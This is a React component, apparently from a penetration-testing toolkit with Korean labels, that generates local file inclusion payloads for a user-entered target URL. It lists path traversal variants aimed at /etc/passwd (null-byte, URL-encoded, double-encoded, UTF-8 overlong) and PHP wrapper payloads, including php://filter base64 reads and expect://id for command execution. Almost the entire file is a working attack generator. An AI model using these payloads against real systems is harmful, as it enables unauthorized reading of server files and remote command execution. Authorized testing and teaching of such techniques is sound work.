import { useState } from 'react'
import { DISCLAIMER, Note, TextInput, Readout } from './shared'

export function LfiPayloadBuilder() {
  const [url, setUrl] = useState('')
  const trimmed = url.trim()
  const base = trimmed || 'https://TARGET/view?file='

  const traversal = [
    { label: 'Standard Traversal', code: '../../../etc/passwd' },
    { label: 'Null Byte (PHP < 5.3)', code: '../../../etc/passwd%00' },
    { label: 'URL Encoding', code: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd' },
    { label: 'Double Encoding', code: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd' },
    { label: 'UTF-8 Overlong', code: '..%c0%af..%c0%af..%c0%afetc/passwd' },
  ]

  const wrappers = [
    { label: 'PHP Filter (Base64)', code: 'php://filter/convert.base64-encode/resource=/etc/passwd' },
    { label: 'PHP Filter (Read)', code: 'php://filter/read=convert.base64-encode/resource=/etc/passwd' },
    { label: 'PHP Expect', code: 'expect://id' },
    { label: 'PHP Data', code: 'data://text/plain;base64,SGVsbG8gd29ybGQ=' },
  ]

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="대상 URL/파라미터" value={url} onChange={setUrl} placeholder="https://example.com/view?file=" />
      
      <div className="payload-readout-group">
        <strong className="payload-group-title">Traversal 변형</strong>
        {traversal.map((p, i) => (
          <Readout key={i} title={p.label} value={base + p.code} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">PHP Wrapper 조합</strong>
        {wrappers.map((p, i) => (
          <Readout key={i} title={p.label} value={base + p.code} wrap="anywhere" />
        ))}
      </div>
    </div>
  )
}

export default LfiPayloadBuilder
